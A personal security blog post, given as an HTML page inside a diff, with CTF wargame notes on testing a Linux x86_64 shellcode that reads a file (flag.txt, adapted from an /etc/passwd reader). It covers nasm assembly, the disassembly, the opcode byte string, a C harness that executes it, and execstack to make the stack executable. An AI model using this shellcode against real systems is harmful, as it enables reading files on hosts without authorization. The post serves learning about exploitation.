@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="keywords" content="c, asm, ctf, wargames">
+        <meta name="description" content="While playing some (wargames)[http://blog.dornea.nu/tag/wargames/] where I had to read a file called flag.txt using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use ...">
+        <title>Testing shellcodes - blog.dornea.nu</title>
+        <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+        <link rel="stylesheet" href="/css/ipython.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/bootstrap.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/font-icons/style.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/niu2.min.css" type="text/css" />
+        <link rel="stylesheet" href="/css/custom.css" type="text/css" />
+		
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/jquery-1.11.0.min.js"></script>
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/niu2.min.js"></script>
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/bootstrap.min.js"></script>
+        
+        <link rel="canonical" href="http://blog.dornea.nu/2016/08/23/testing-shellcodes" />
+        <script type="text/javascript">window.onload=function(){};</script>
+        <!--[if lt IE 9]>
+            <script src="http://blog.dornea.nu/theme/js/html5shiv.js"></script>
+            <script src="http://blog.dornea.nu/theme/js/respond.min.js"></script>
+        <![endif]-->
+    </head>
+    <body> 
+        <div id="body-header">
+            <div class="navbar navbar-inverse navbar-fixed-top">
+                <div class="col-md-12">
+                    <div class="navbar-header">
+                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </button>
+                        <a class="navbar-brand" href="http://blog.dornea.nu">
+                            <i class="icon-home"></i>blog.dornea.nu
+                        </a>
+                    </div>
+                    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
+                        <ul class="nav navbar-nav">
+                            <li><a href="http://dornea.nu" title="about">
+                                <i class="icon-user"></i>about</a>
+                            </li>
+                            <li><a href="/archives.html" title="archives">
+                                <i class="icon-archive"></i>archives</a>
+                            </li>
+                            <li><a href="/tags.html" title="tags">
+                                <i class="icon-tag"></i>tags</a>
+                            </li>
+                            <li><a href="/feeds/rss.xml" title="feeds">
+                                <i class="icon-rss"></i>feeds</a>
+                            </li>
+                        <!-- category dropdown list -->
+                        <li class="dropdown">
+                           <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                                <i class="icon-folder-open"></i>category<b class="caret"></b>
+                           </a>
+                           <ul class="dropdown-menu">
+                               <li><a href="http://blog.dornea.nu/category/blog">
+                                      <i class="icon-pencil"></i>blog
+                                      (109)</a></li>
+                               <li><a href="http://blog.dornea.nu/category/low">
+                                   <i class="icon-folder-close"></i>LOW
+                                      (27)</a></li>
+                               <li><a href="http://blog.dornea.nu/category/notes">
+                                      <i class="icon-book"></i>notes
+                                      (20)</a></li>
+                           </ul>
+                        </li>
+                        <!--  self defined dropdown list -->
+                        </ul>
+                        
+                        <!-- right nav bar -->
+                        <ul class="nav navbar-nav navbar-right">
+                        <!-- google custom search -->
+                        <li>
+                        <div id="niu2-cse-wrapper">
+                            <div id="niu2-cse-header-box" class="navbar-form navbar-nav">
+                                <form action="http://google.com/cse">
+                                    <input type="hidden" name="cx" value="008508447409818574933:pxyxuhrgnxi" />
+                                    <input type="hidden" name="ie" value="UTF-8" />
+                                    <div class="form-group">
+                                        <input id="niu2-cse-search-input" class="niu2-cse-header form-control" 
+                                            type="text" name="q" 
+                                            placeholder="Press enter to search ..."/>
+                                    </div>
+                                </form>
+                           </div>
+                           <div id="niu2-cse-ctrl-box" class="navbar-nav">
+                            <i id="niu2-cse-search-image" class="icon-search navbar-nav"></i><span id="niu2-cse-search-text">Search</span>
+                           </div>
+                       </div>
+                       </li>
+                       </ul>
+                    </nav>
+                </div>
+            </div>
+<style>
+    #banner{
+        background-image:url("http://blog.dornea.nu//images/header.jpg");
+    }   
+</style>
+
+<div id="banner">
+    <div class="container">
+        <div class="copy">
+            <h2>blog.dornea.nu</h2>
+                <p class="intro">Hack, code and drink some țuică. Personal blog of Victor Dorneanu.</p>
+        </div>
+    </div>
+</div>
+            <!-- End Banner -->
+        </div>
+
+        <div id="body-content">
+            <div class="col-md-8 col-md-offset-2">
+                <h1 id="content-heading">Testing shellcodes</h1>
+            </div>
+            <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
+                <div id="niu2-main-content">
+                    <p>While playing some (wargames)[http://blog.dornea.nu/tag/wargames/] where I had to read a file called <strong>flag.txt</strong> using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.</p>
+<div class="highlight"><pre><span class="nf">BITS</span> <span class="mi">64</span>
+<span class="err">;</span> <span class="nf">Author</span> <span class="no">Mr.Un1k0d3r</span> <span class="p">-</span> <span class="no">RingZer0</span> <span class="no">Team</span>
+<span class="err">;</span> <span class="nf">Read</span> <span class="err">/</span><span class="no">etc</span><span class="err">/</span><span class="no">passwd</span> <span class="no">Linux</span> <span class="no">x86_64</span> <span class="no">Shellcode</span>
+<span class="err">;</span> <span class="nf">Shellcode</span> <span class="no">size</span> <span class="mi">82</span> <span class="no">bytes</span>
+<span class="nf">global</span> <span class="no">_start</span>
+
+<span class="nf">section</span> <span class="no">.text</span>
+
+<span class="nl">_start:</span>
+    <span class="nf">jmp</span> <span class="no">_push_filename</span>
+
+<span class="nl">_readfile:</span>
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">open</span> <span class="no">file</span>
+    <span class="nf">pop</span> <span class="no">rdi</span> <span class="err">;</span> <span class="no">pop</span> <span class="no">path</span> <span class="no">value</span>
+    <span class="err">;</span> <span class="nf">NULL</span> <span class="no">byte</span> <span class="no">fix</span>
+    <span class="nf">xor</span> <span class="no">byte</span> <span class="err">[</span><span class="no">rdi</span> <span class="err">+</span> <span class="mi">11</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x41</span>
+
+    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+    <span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">2</span>
+    <span class="nf">xor</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsi</span> <span class="err">;</span> <span class="no">set</span> <span class="no">O_RDONLY</span> <span class="no">flag</span>
+    <span class="nf">syscall</span>
+
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">read</span> <span class="no">file</span>
+    <span class="nf">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="mi">0xfff</span>
+    <span class="nf">lea</span> <span class="no">rsi</span><span class="p">,</span> <span class="err">[</span><span class="no">rsp</span><span class="err">]</span>
+    <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+    <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
+    <span class="nf">mov</span> <span class="no">dx</span><span class="p">,</span> <span class="mi">0xfff</span><span class="err">;</span> <span class="no">size</span> <span class="no">to</span> <span class="no">read</span>
+    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+    <span class="nf">syscall</span>
+
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">write</span> <span class="no">to</span> <span class="no">stdout</span>
+    <span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdi</span>
+    <span class="nf">add</span> <span class="no">dil</span><span class="p">,</span> <span class="mi">1</span> <span class="err">;</span> <span class="no">set</span> <span class="no">stdout</span> <span class="no">fd</span> <span class="err">=</span> <span class="mi">1</span>
+    <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>
+    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+    <span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">1</span>
+    <span class="nf">syscall</span>
+
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">exit</span>
+    <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+    <span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">60</span>
+    <span class="nf">syscall</span>
+
+<span class="nl">_push_filename:</span>
+    <span class="nf">call</span> <span class="no">_readfile</span>
+    <span class="nl">path:</span> <span class="nf">db</span> <span class="err">"</span><span class="no">flag.txt</span><span class="err">"</span>
+</pre></div>
+<h2 id="0464de5a27d6ea7620de8f123c25b73b">Shellcode compilation</h2>
+<p>Compile using <strong>nasm</strong>:</p>
+<div class="highlight"><pre><span class="nv">$ </span>nasm -f elf64 shellcode.asm -o shellcode.o
+</pre></div>
+<h2 id="ecb7677e094d5e91766c7aae919dfc12">Disassemble</h2>
+<p>Now you can disassemble the object file using <strong>objdump</strong>:</p>
+<div class="highlight"><pre>shellcode.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+<span class="m">0000000000000000</span> &lt;_start&gt;:
+   0:   eb 3f                   jmp    <span class="m">41</span> &lt;_push_filename&gt;
+
+<span class="m">0000000000000002</span> &lt;_readfile&gt;:
+   2:   5f                      pop    %rdi
+   3:   <span class="m">80</span> <span class="m">77</span> 0b <span class="m">41</span>             xorb   <span class="nv">$0x41</span>,0xb<span class="o">(</span>%rdi<span class="o">)</span>
+   7:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
+   a:   <span class="m">04</span> <span class="m">02</span>                   add    <span class="nv">$0x2</span>,%al
+   c:   <span class="m">48</span> <span class="m">31</span> f6                xor    %rsi,%rsi
+   f:   0f <span class="m">05</span>                   syscall 
+  11:   <span class="m">66</span> <span class="m">81</span> ec ff 0f          sub    <span class="nv">$0xfff</span>,%sp
+  16:   <span class="m">48</span> 8d <span class="m">34</span> <span class="m">24</span>             lea    <span class="o">(</span>%rsp<span class="o">)</span>,%rsi
+  1a:   <span class="m">48</span> <span class="m">89</span> c7                mov    %rax,%rdi
+  1d:   <span class="m">48</span> <span class="m">31</span> d2                xor    %rdx,%rdx
+  20:   <span class="m">66</span> ba ff 0f             mov    <span class="nv">$0xfff</span>,%dx
+  24:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
+  27:   0f <span class="m">05</span>                   syscall 
+  29:   <span class="m">48</span> <span class="m">31</span> ff                xor    %rdi,%rdi
+  2c:   <span class="m">40</span> <span class="m">80</span> c7 <span class="m">01</span>             add    <span class="nv">$0x1</span>,%dil
+  30:   <span class="m">48</span> <span class="m">89</span> c2                mov    %rax,%rdx
+  33:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
+  36:   <span class="m">04</span> <span class="m">01</span>                   add    <span class="nv">$0x1</span>,%al
+  38:   0f <span class="m">05</span>                   syscall 
+  3a:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
+  3d:   <span class="m">04</span> 3c                   add    <span class="nv">$0x3c</span>,%al
+  3f:   0f <span class="m">05</span>                   syscall 
+
+<span class="m">0000000000000041</span> &lt;_push_filename&gt;:
+  41:   e8 bc ff ff ff          callq  <span class="m">2</span> &lt;_readfile&gt;
+
+<span class="m">0000000000000046</span> &lt;path&gt;:
+  46:   <span class="m">66</span> 6c                   data16 insb <span class="o">(</span>%dx<span class="o">)</span>,%es:<span class="o">(</span>%rdi<span class="o">)</span>
+  48:   <span class="m">61</span>                      <span class="o">(</span>bad<span class="o">)</span>  
+  49:   <span class="m">67</span> 2e <span class="m">74</span> <span class="m">78</span>             addr32 je,pn c5 &lt;path+0x7f&gt;
+  4d:   <span class="m">74</span>                      .byte 0x74
+</pre></div>
+<h2 id="f02261a0a5ad1f239afb5f846cb74c93">Assembler to C</h2>
+<p>Now convert the opcodes to some C array:</p>
+<div class="highlight"><pre><span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>objdump -d shellcode.o <span class="p">|</span>grep <span class="s2">"^ "</span> <span class="p">|</span>cut -f2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s1">'\\x'</span><span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
+<span class="se">\x</span>eb<span class="se">\x</span>3f<span class="se">\x</span>5f<span class="se">\x</span>80<span class="se">\x</span>77<span class="se">\x</span>0b<span class="se">\x</span>41<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>04<span class="se">\x</span>02<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>66<span class="se">\x</span>81<span class="se">\x</span>ec<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>66<span class="se">\x</span>ba<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>40<span class="se">\x</span>80<span class="se">\x</span>c7<span class="se">\x</span>01<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c2<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>04<span class="se">\x</span>01<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>04<span class="se">\x</span>3c<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>e8<span class="se">\x</span>bc<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>66<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>67<span class="se">\x</span>2e<span class="se">\x</span>74<span class="se">\x</span>78<span class="se">\x</span>74
+</pre></div>
+<p>Now use this code:</p>
+<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="cp">#include &lt;fcntl.h&gt;</span>
+<span class="cp">#include &lt;sys/types.h&gt;</span>
+<span class="cp">#include &lt;sys/stat.h&gt;</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+    <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">code</span><span class="p">;</span>
+    <span class="n">fp</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+<h2 id="bd1c8253223bcef1ddd2dbf8e157d42d">C code compilation</h2>
+<p>... and compile it.</p>
+<div class="highlight"><pre><span class="nv">$ </span>gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
+bin.c: In <span class="k">function</span> <span class="s1">'main'</span>:
+bin.c:20:1: warning: control reaches end of non-void <span class="k">function</span> <span class="o">[</span>-Wreturn-type<span class="o">]</span>
+ <span class="o">}</span>
+</pre></div>
+<h2 id="4251f63cae49679e4047bdde24b087c4">Make stack executable</h2>
+<p>The binary will segfault if executed. That's because the stack isn't executable:</p>
+<div class="highlight"><pre><span class="nv">$ </span>readelf -l bin <span class="p">|</span> grep -C <span class="m">2</span> GNU_STACK
+
+  GNU_EH_FRAME   0x00000000000005e4 0x00000000004005e4 0x00000000004005e4
+                 0x0000000000000034 0x0000000000000034  R      4
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RW     10
+</pre></div>
+<p>Let's make the stack executable:</p>
+<div class="highlight"><pre><span class="nv">$ </span>/usr/sbin/execstack -s bin
+</pre></div>
+<p>And finally run the executable:</p>
+<div class="highlight"><pre><span class="nv">$ </span>cat flag.txt
+bla
+<span class="nv">$ </span>./bin
+bla
+</pre></div>
+                </div>
+<hr/>
+<div style="float:left;">
+	Prev: <a href="http://blog.dornea.nu/2016/02/18/tls-client-authentication-using-bitnami-nginx-stack" align='left'>
+	 TLS Client authentication using Bitnami Nginx stack
+	</a>
+</div>
+</p>
+
+                <!-- Add comments -->
+<div id="content-comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname="dorneanu";
+				var disqus_identifier = 'testing-shellcodes';
+			var disqus_url = 'http://blog.dornea.nu/2016/08/23/testing-shellcodes';
+
+		var disqus_config = function () {
+			this.language = "en";
+		};
+ 
+        
+        (function(){var a=document.createElement("script");a.type="text/javascript";a.async=true;a.src="//"+disqus_shortname+".disqus.com/embed.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)})();</script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div> 
+            </div>
+            <div class="niu2-right-container col-md-2">
+                <div id="niu2-sidebar-meta" class="niu2-sidebar">
+                    <div class="niu2-sidebar-label"><i class="icon-calendar"></i>Published:</div>
+                    <div class="niu2-sidebar-value">2016-08-23 00:00</div>
+                    <div class="niu2-sidebar-label"><i class="icon-book"></i>category:</div>
+                    <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/notes">notes</a></div>
+                    <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/c/">c</a><sup>7</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/asm/">asm</a><sup>2</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>5</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>10</sup></div>
+                </div>
+
+                <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
+                    <div class="niu2-sidebar-label">
+                        <i id="niu2-sidebar-toc-ctrl" class="icon-open-tocs"></i>Table of contents
+                    </div>
+                    <ul id="niu2-sidebar-toc-list">
+                        <li><a href="#content-heading">Testing shellcodes</a></li>
+                        <li><a href='#0464de5a27d6ea7620de8f123c25b73b'>Shellcode compilation</a></li><li><a href='#ecb7677e094d5e91766c7aae919dfc12'>Disassemble</a></li><li><a href='#f02261a0a5ad1f239afb5f846cb74c93'>Assembler to C</a></li><li><a href='#bd1c8253223bcef1ddd2dbf8e157d42d'>C code compilation</a></li><li><a href='#4251f63cae49679e4047bdde24b087c4'>Make stack executable</a></li>
+                        <li><a href="#content-comments">Comments</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div id="niu2-toolbar">
+                <ul class="list-unstyled">
+                    <li><a id="niu2-toolbar-ctrlsidebar" href="#" title="Hide Sidebar"><i class="icon-3x icon-hide-sidebar"></i></a></li>
+                </ul>
+                <div id="niu2-toolbar-showsidebar" data-title="Show Sidebar"></div>
+                <div id="niu2-toolbar-github" data-repo=""></div>
+                <div id="niu2-toolbar-bitbucket" data-repo=""></div>
+            </div>
+            <div id="niu2-toc" data-style="fixed"></div>
+        </div>
+
+        <div class="niu2-footer">
+            <div id="body-footer" class="col-md-6 col-md-offset-2">
+                <hr/>
+                <p>
+                    Powered by <a href="https://github.com/getpelican/pelican">Pelican</a>, 
+                    <a href="https://github.com/mawenbao/niu-x2-sidebar">theme</a> built with <a href="https://github.com/twbs/bootstrap">Bootstrap3</a>
+                    by <a href="https://blog.mawenbao.com">Ma Wenbao</a>, icons by 
+                    <a href="https://fortawesome.github.io/Font-Awesome">Font Awesome</a>.
+                </p>
+                <p>
+                    © 2008 - 2016
+                    <a class="niu2-footer-link" href="http://blog.dornea.nu">Victor Dorneanu</a>
+                </p>
+                <p class="niu2-icons">
+                    <a class="niu2-footer-icon" href="https://pgp.mit.edu/pks/lookup?op=get&search=0x18F1AD46FB05E1B7" title="my public key">
+                        <i class="icon-key icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="mailto: no-spam ÄATT dornea DOT nu" title="my email address">
+                        <i class="icon-envelope-o icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="http://github.com/dorneanu" title="my github page">
+                        <i class="icon-github-alt icon-lg"></i>
+                    </a>
+                    <a class="niu2-footer-icon" href="/feeds/rss.xml" title="subscribe my blog">
+                        <i class="icon-rss icon-lg"></i>
+                    </a>
+                </p>
+            </div>
+        </div>
+
+        <script type="text/javascript">
+            var _gaq=_gaq||[];
+            _gaq.push(["_setAccount","UA-7161767-3"]);
+            _gaq.push(["_trackPageview"]);
+            (function(){
+                var b=document.createElement("script");
+                b.type="text/javascript";
+                b.async=true;
+                b.src=("https:"==document.location.protocol?"https://ssl":"http://www")+".google-analytics.com/ga.js";
+                var a=document.getElementsByTagName("script")[0];
+                a.parentNode.insertBefore(b,a)
+            })();
+        </script>
+        <div id="niu2-pygments" data-theme="github"></div>
+        <div id="niu2-lazy-load" data-loading-txt="Loading image" data-loading-icon="icon-spin icon-spinner"></div>
+        <div id="niu2-toolbar-load" data-loading-icon="icon-spin icon-4x icon-spinner"></div>
+        <script type="text/javascript" src="/js/custom.js"></script>
+        <script type="text/javascript">
+            onContentLoaded();
+        </script>
+    </body>
+</html>
